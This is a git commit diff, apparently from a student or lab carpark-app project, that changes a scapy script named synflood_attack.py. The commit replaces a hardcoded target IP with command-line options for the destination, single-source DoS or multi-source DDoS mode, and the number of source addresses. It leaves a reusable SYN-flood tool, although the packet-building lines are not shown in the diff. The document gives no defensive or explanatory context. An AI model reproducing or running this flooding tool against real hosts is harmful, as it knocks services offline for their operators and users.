427b9d490beacd39ea7a3d5e01f2da8c69af6066
dongyuu1 <147731990+dongyuu1@users.noreply.github.com>
2024-04-15 12:24:23 +0800

    Add files via upload

--- Carpark_App_new/client/synflood_attack.py
+++ Carpark_App_new/client/synflood_attack.py
@@ -1,11 +1,12 @@
 from scapy.all import *
 from scapy.layers.inet import IP, TCP
 import random
+import argparse
 
 data = "asasfa"
 
 
-def syn_flood(dst='172.16.1.101', dos=False, ipnum=5):
+def syn_flood(dst, dos=False, ipnum=5):
     if dos:
         ipnum = 1
 
@@ -18,4 +19,11 @@ def syn_flood(dst='172.16.1.101', dos=False, ipnum=5):
         send(packet)
 
 
-syn_flood()
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--dst", type=str, help="The dst ip address")
+    parser.add_argument("--dos", type=int, help="1: perform dos attack; 0: perform ddos attack")
+    parser.add_argument("--ipnum", type=int, help="The number of source ip addresses used in ddos")
+    args = parser.parse_args()
+
+    syn_flood(args.dst, args.dos, args.ipnum)
